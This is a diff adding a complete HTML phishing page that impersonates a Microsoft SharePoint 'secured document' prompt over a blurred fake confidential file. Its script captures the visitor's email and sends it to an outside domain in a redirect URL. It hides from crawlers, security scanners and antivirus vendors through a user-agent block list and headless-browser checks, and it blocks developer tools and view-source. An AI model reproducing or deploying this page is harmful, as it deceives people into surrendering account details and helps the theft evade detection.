@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="no-referrer">
+<title>Secure Document Access</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Helvetica,sans-serif;min-height:100vh;background:#e8edf3;display:flex;flex-direction:column;position:relative;overflow:hidden}
+.pg{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:820px;min-height:95vh;max-width:97vw;background:#fff;box-shadow:0 10px 50px rgba(0,0,0,0.2);filter:blur(4px);opacity:0.78;pointer-events:none;z-index:0;padding:50px 56px;user-select:none}
+.pg-wm{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-32deg);font-size:72px;font-weight:900;color:rgba(0,100,200,0.04);letter-spacing:6px;white-space:nowrap;pointer-events:none}
+.pg-top{display:flex;align-items:flex-start;gap:14px;padding-bottom:16px;border-bottom:2.5px solid #0072c6;margin-bottom:28px}
+.pg-icon{width:42px;height:42px;background:#0072c6;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.pg-icon svg{width:24px;height:24px;fill:#fff}
+.pg-ttl{font-size:18px;font-weight:700;color:#1a1a1a;line-height:1.3}
+.pg-sub{font-size:11px;color:#666;margin-top:3px}
+.pg-stamp{margin-left:auto;border:2.5px solid #b91c1c;color:#b91c1c;font-size:10px;font-weight:800;letter-spacing:2px;padding:4px 9px;border-radius:2px;transform:rotate(-6deg);white-space:nowrap;flex-shrink:0}
+.pg-sh{font-size:11px;font-weight:700;color:#0072c6;text-transform:uppercase;letter-spacing:0.5px;border-left:3px solid #0072c6;padding-left:7px;margin-bottom:9px}
+.pg-p{font-size:12px;color:#333;line-height:1.85;margin-bottom:7px}
+.pg-p.dim{color:#888;font-size:11px}
+.pg-p.bold{font-weight:700;color:#111}
+.pg-sec{margin-bottom:24px}
+.pg-hr{height:1px;background:#e5e5e5;margin:18px 0}
+.pg-tbl{width:100%;border-collapse:collapse;font-size:11.5px;margin-bottom:12px}
+.pg-tbl th{background:#0072c6;color:#fff;padding:6px 11px;text-align:left;font-weight:600}
+.pg-tbl td{padding:6px 11px;border-bottom:1px solid #efefef;color:#333}
+.pg-tbl tr:nth-child(even) td{background:#f8f8f8}
+.pg-sigs{display:flex;gap:36px;margin-top:28px}
+.pg-sig{flex:1}
+.pg-sigln{height:1px;background:#444;margin-bottom:4px}
+.pg-siglb{font-size:10px;color:#888}
+.bar{position:relative;z-index:10;height:44px;background:rgba(255,255,255,0.94);backdrop-filter:blur(10px);border-bottom:1px solid #e0e0e0;display:flex;align-items:center;padding:0 18px;gap:9px;box-shadow:0 1px 4px rgba(0,0,0,0.07)}
+.wfl{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:15px;height:15px}
+.wfl span{display:block}
+.wfl span:nth-child(1){background:#f25022}
+.wfl span:nth-child(2){background:#7fba00}
+.wfl span:nth-child(3){background:#00a4ef}
+.wfl span:nth-child(4){background:#ffb900}
+.bar-nm{font-size:14px;font-weight:600;color:#106ebe}
+.bar-dv{width:1px;height:17px;background:#ccc;margin:0 5px}
+.bar-tx{font-size:12px;color:#666}
+.ct{flex:1;display:flex;align-items:center;justify-content:center;padding:24px 16px;position:relative;z-index:10}
+.cd{background:#fff;width:100%;max-width:390px;border-radius:4px;box-shadow:0 6px 28px rgba(0,0,0,0.16),0 0 1px rgba(0,0,0,0.09);overflow:hidden;animation:riseUp .3s ease both}
+@keyframes riseUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+.cd-top{height:4px;background:linear-gradient(90deg,#0072c6,#038387)}
+.cd-bd{padding:26px 30px 30px}
+.dr{display:flex;align-items:center;gap:12px;background:#f4f4f4;border:1px solid #e8e8e8;border-radius:3px;padding:11px 13px;margin-bottom:20px}
+.di{width:36px;height:36px;background:#185abd;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.di svg{width:20px;height:20px;fill:#fff}
+.dn{font-size:12px;font-weight:600;color:#1a1a1a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dm{font-size:10px;color:#666;margin-top:2px}
+.dlk svg{width:15px;height:15px;fill:#666}
+.cd-h{font-size:16px;font-weight:700;color:#1a1a1a;margin-bottom:6px}
+.cd-d{font-size:12px;color:#666;line-height:1.65;margin-bottom:18px}
+.il{display:block;font-size:11px;font-weight:600;color:#1a1a1a;margin-bottom:4px}
+.iw{position:relative}
+.iw input{width:100%;height:32px;padding:0 32px 0 9px;border:1px solid #999;border-radius:2px;font-size:13px;font-family:inherit;color:#1a1a1a;outline:none;transition:border-color .12s;box-sizing:border-box}
+.iw input:focus{border-color:#0072c6;border-width:2px}
+.iw input.bad{border-color:#c0392b!important}
+.isp{position:absolute;right:8px;top:50%;transform:translateY(-50%);width:13px;height:13px;border:2px solid #e0e0e0;border-top-color:#0072c6;border-radius:50%;animation:turn .75s linear infinite;display:none}
+.isp.on{display:block}
+.em{font-size:10px;color:#c0392b;margin-top:3px;display:none;align-items:center;gap:3px}
+.em.on{display:flex}
+.hp{position:absolute;left:-9999px;top:-9999px;opacity:0;height:0;width:0}
+.btn{width:100%;height:32px;background:#0072c6;color:#fff;border:none;border-radius:2px;font-size:13px;font-family:inherit;font-weight:600;cursor:pointer;margin-top:15px;display:flex;align-items:center;justify-content:center;gap:7px;transition:background .12s,opacity .12s}
+.btn:hover{background:#005fa3}
+.btn:active{background:#004f8a}
+.btn:disabled{opacity:.65;cursor:not-allowed}
+.bsp{width:12px;height:12px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:turn .7s linear infinite;display:none}
+.bsp.on{display:block}
+@keyframes turn{to{transform:rotate(360deg)}}
+.nt{margin-top:11px;font-size:10px;color:#888;display:flex;align-items:flex-start;gap:5px;line-height:1.5}
+.nt svg{width:11px;height:11px;fill:#888;flex-shrink:0;margin-top:1px}
+.cd-ft{border-top:1px solid #ebebeb;padding:9px 30px;display:flex;align-items:center;justify-content:space-between}
+.cd-ft span{font-size:10px;color:#888}
+.cd-ft a{font-size:10px;color:#0072c6;text-decoration:none}
+.cd-ft a:hover{text-decoration:underline}
+.lov{display:none;position:fixed;inset:0;background:rgba(232,237,243,0.96);backdrop-filter:blur(5px);flex-direction:column;align-items:center;justify-content:center;z-index:300}
+.lov.on{display:flex;animation:fadeIn .3s ease}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.lring{position:relative;width:58px;height:58px;margin-bottom:20px}
+.lring::before,.lring::after{content:'';position:absolute;border-radius:50%}
+.lring::before{inset:0;border:4px solid #ddd}
+.lring::after{inset:0;border:4px solid transparent;border-top-color:#0072c6;border-right-color:#038387;animation:turn .85s linear infinite}
+.lic{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
+.lic svg{width:20px;height:20px;fill:#0072c6}
+.lov h2{font-size:15px;font-weight:700;color:#1a1a1a;margin-bottom:5px}
+.lov p{font-size:12px;color:#666;margin-bottom:4px}
+.lst{font-size:11px;color:#0072c6;font-weight:600;margin-bottom:13px;min-height:16px}
+.pb{width:255px;height:3px;background:#ddd;border-radius:3px;overflow:hidden}
+.pf{height:100%;background:linear-gradient(90deg,#0072c6,#038387);width:0%;transition:width linear}
+.pft{position:relative;z-index:10;text-align:center;padding:11px;font-size:10px;color:#aaa}
+.pft a{color:#aaa;text-decoration:none;margin:0 6px}
+.pft a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+
+<div class="pg" aria-hidden="true">
+  <div class="pg-wm">CONFIDENTIAL</div>
+  <div class="pg-top">
+    <div class="pg-icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5zM8.3 17l1.4-5.2 1.3 5.2h1.2l1.7-7h-1.2l-1.1 4.9-1.2-4.9H9.2L8 14.9 6.9 10H5.7l1.7 7H8.3z"/></svg></div>
+    <div>
+      <div class="pg-ttl">Confidential Project Overview — 2026 Q1</div>
+      <div class="pg-sub">Internal Use Only &nbsp;·&nbsp; Restricted &nbsp;·&nbsp; Do Not Forward</div>
+    </div>
+    <div class="pg-stamp">CONFIDENTIAL</div>
+  </div>
+  <div class="pg-sec">
+    <div class="pg-sh">Executive Summary</div>
+    <p class="pg-p bold">Project Scope and Strategic Objectives</p>
+    <p class="pg-p">This document outlines the full scope of work, deliverables, and project milestones for the 2026 Q1 initiative. All information contained herein is strictly confidential and intended solely for authorized personnel.</p>
+    <p class="pg-p">The project team has identified several key areas requiring immediate attention and resource allocation. Budget projections have been revised to reflect updated cost estimates provided by the finance department.</p>
+    <p class="pg-p dim">Reference: PRJ-2026-001 &nbsp;·&nbsp; Classification: RESTRICTED &nbsp;·&nbsp; Version: 3.2</p>
+  </div>
+  <div class="pg-hr"></div>
+  <div class="pg-sec">
+    <div class="pg-sh">Project Milestones &amp; Budget</div>
+    <table class="pg-tbl">
+      <thead><tr><th>Milestone</th><th>Target Date</th><th>Owner</th><th>Budget</th><th>Status</th></tr></thead>
+      <tbody>
+        <tr><td>Phase 1 — Discovery</td><td>Jan 15, 2026</td><td>J. Anderson</td><td>$142,000</td><td>Complete</td></tr>
+        <tr><td>Phase 2 — Development</td><td>Feb 28, 2026</td><td>R. Thompson</td><td>$380,000</td><td>In Progress</td></tr>
+        <tr><td>Phase 3 — Review</td><td>Mar 20, 2026</td><td>S. Patel</td><td>$95,000</td><td>Pending</td></tr>
+        <tr><td>Phase 4 — Deployment</td><td>Apr 10, 2026</td><td>M. Clarke</td><td>$210,000</td><td>Pending</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="pg-sec">
+    <div class="pg-sh">Confidential Notes</div>
+    <p class="pg-p">The following section contains commercially sensitive pricing, vendor agreements, and internal financial projections. Unauthorized disclosure may result in disciplinary action and legal liability.</p>
+    <p class="pg-p bold">Total Project Value: $827,000 &nbsp;·&nbsp; Approved: Executive Committee &nbsp;·&nbsp; January 2026</p>
+  </div>
+  <div class="pg-hr"></div>
+  <div class="pg-sigs">
+    <div class="pg-sig"><div class="pg-sigln"></div><div class="pg-siglb">Project Director — Date</div></div>
+    <div class="pg-sig"><div class="pg-sigln"></div><div class="pg-siglb">Executive Sponsor — Date</div></div>
+    <div class="pg-sig"><div class="pg-sigln"></div><div class="pg-siglb">Legal Representative — Date</div></div>
+  </div>
+</div>
+
+<div class="bar">
+  <div style="display:flex;align-items:center;gap:7px">
+    <div class="wfl"><span></span><span></span><span></span><span></span></div>
+    <span class="bar-nm">SharePoint</span>
+  </div>
+  <div class="bar-dv"></div>
+  <span class="bar-tx">Secure File Access</span>
+</div>
+
+<div class="ct">
+  <div class="cd">
+    <div class="cd-top"></div>
+    <div class="cd-bd">
+      <div class="dr">
+        <div class="di"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5zM8.3 17l1.4-5.2 1.3 5.2h1.2l1.7-7h-1.2l-1.1 4.9-1.2-4.9H9.2L8 14.9 6.9 10H5.7l1.7 7H8.3z"/></svg></div>
+        <div style="flex:1;overflow:hidden">
+          <div class="dn">Confidential_Project_Overview_2026.docx</div>
+          <div class="dm">Shared via SharePoint &nbsp;·&nbsp; Requires verification</div>
+        </div>
+        <div class="dlk"><svg viewBox="0 0 24 24"><path d="M18 11H17V7A5 5 0 0 0 7 7v4H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2zm-6 7a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3-7H9V7a3 3 0 0 1 6 0v4z"/></svg></div>
+      </div>
+      <div class="cd-h">You've received a secured document</div>
+      <p class="cd-d">The shared file will appear on your screen after verification.<br>Please enter your email address to continue.</p>
+      <label class="il" for="femail">Email address</label>
+      <div class="iw">
+        <input type="email" id="femail" placeholder="name@organization.com" autocomplete="email">
+        <div class="isp" id="isp"></div>
+      </div>
+      <div class="em" id="emsg">
+        <svg viewBox="0 0 12 12"><path d="M6 0a6 6 0 1 0 0 12A6 6 0 0 0 6 0zm.75 9h-1.5V5.5h1.5V9zm0-4.5h-1.5v-1.5h1.5v1.5z"/></svg>
+        Please enter a valid email address.
+      </div>
+      <input class="hp" type="text" id="hp" name="company" tabindex="-1" autocomplete="off">
+      <button class="btn" id="sbtn" onclick="go()">
+        <span id="btx">Verify &amp; Open Document</span>
+        <div class="bsp" id="bsp"></div>
+      </button>
+      <div class="nt">
+        <svg viewBox="0 0 12 12"><path d="M6 0a6 6 0 1 0 0 12A6 6 0 0 0 6 0zm.75 9h-1.5V5.5h1.5V9zm0-4.5h-1.5v-1.5h1.5v1.5z"/></svg>
+        Your email is used solely to verify access. The document opens automatically after confirmation.
+      </div>
+    </div>
+    <div class="cd-ft">
+      <span>SharePoint</span>
+      <a href="#">Privacy statement</a>
+    </div>
+  </div>
+</div>
+
+<div class="pft">
+  <a href="#">Terms of use</a>
+  <a href="#">Privacy &amp; cookies</a>
+  <a href="#">IT Support</a>
+</div>
+
+<div class="lov" id="lov">
+  <div class="lring">
+    <div class="lic"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5zM8.3 17l1.4-5.2 1.3 5.2h1.2l1.7-7h-1.2l-1.1 4.9-1.2-4.9H9.2L8 14.9 6.9 10H5.7l1.7 7H8.3z"/></svg></div>
+  </div>
+  <h2>Verifying your access...</h2>
+  <p>Decrypting and preparing your document.</p>
+  <div class="lst" id="lst">Checking credentials...</div>
+  <div class="pb"><div class="pf" id="pf"></div></div>
+</div>
+
+<script>
+  const DEST="https://welbeaconcap.brandovex.com/BEWF82M62/";
+  const STEPS=["Checking credentials...","Validating account access...","Decrypting document...","Preparing secure viewer...","Opening document..."];
+  function b64(s){return btoa(unescape(encodeURIComponent(s)))}
+  const BAD_UA=["googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot","sogou","ia_archiver","mj12bot","dotbot","semrushbot","ahrefsbot","petalbot","rogerbot","wget","curl","python","java/","libwww","scrapy","phantomjs","headlesschrome","go-http-client","okhttp","axios","node-fetch","postman","insomnia","mechanize","lwp","lynx","w3m","spider","crawl","bot","scan","preview","slack","discord","telegram","whatsapp","norton","mcafee","sophos","kaspersky","bitdefender","avast","avg","eset","symantec","msnbot","adidxbot","bingpreview","adsbot","mediapartners","facebot","archive","openlink","feedfetcher","outbrain"];
+  const T0=Date.now();
+  let moused=false,touched=false,typed=false;
+  document.addEventListener("mousemove",()=>{moused=true},{once:true,passive:true});
+  document.addEventListener("touchstart",()=>{touched=true},{once:true,passive:true});
+  document.getElementById("femail").addEventListener("keydown",()=>{typed=true},{once:true});
+  function badUA(){return BAD_UA.some(b=>(navigator.userAgent||"").toLowerCase().includes(b))}
+  function headless(){const n=navigator;return n.webdriver||!n.languages||n.languages.length===0||(n.plugins&&n.plugins.length===0)||(window.outerWidth===0&&window.outerHeight===0)}
+  function hpTripped(){return document.getElementById("hp").value.length>0}
+  function isBot(){return badUA()||headless()||hpTripped()||(Date.now()-T0<900&&!moused&&!touched&&!typed)}
+  window.addEventListener("DOMContentLoaded",()=>{if(badUA()||headless()){document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#aaa;font-size:13px;">This resource requires authentication.</div>'}});
+  function go(){
+    if(isBot())return;
+    const inp=document.getElementById("femail"),emsg=document.getElementById("emsg"),raw=inp.value.trim();
+    if(!raw||!raw.includes("@")||!raw.includes(".")){inp.classList.add("bad");emsg.classList.add("on");inp.focus();return}
+    inp.classList.remove("bad");emsg.classList.remove("on");
+    document.getElementById("isp").classList.add("on");
+    document.getElementById("btx").textContent="Verifying...";
+    document.getElementById("bsp").classList.add("on");
+    document.getElementById("sbtn").disabled=true;
+    inp.disabled=true;
+    setTimeout(()=>{
+      document.getElementById("lov").classList.add("on");
+      const delay=Math.floor(Math.random()*2000)+4000;
+      const lst=document.getElementById("lst"),pf=document.getElementById("pf");
+      pf.style.transition=`width ${delay}ms linear`;
+      setTimeout(()=>{pf.style.width="100%"},60);
+      const si=delay/STEPS.length;
+      STEPS.forEach((s,i)=>{setTimeout(()=>{lst.textContent=s},i*si)});
+      const encoded = encodeURIComponent(raw);
+      setTimeout(function(){window.location.href = DEST + "?email=" + encoded;},delay);
+    },550);
+  }
+  document.getElementById("femail").addEventListener("keydown",e=>{if(e.key==="Enter")go()});
+  document.addEventListener("contextmenu",e=>e.preventDefault());
+  document.addEventListener("keydown",e=>{if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["I","J","C"].includes(e.key))||(e.ctrlKey&&e.key==="U"))e.preventDefault()});
+</script>
+</body>
+</html>
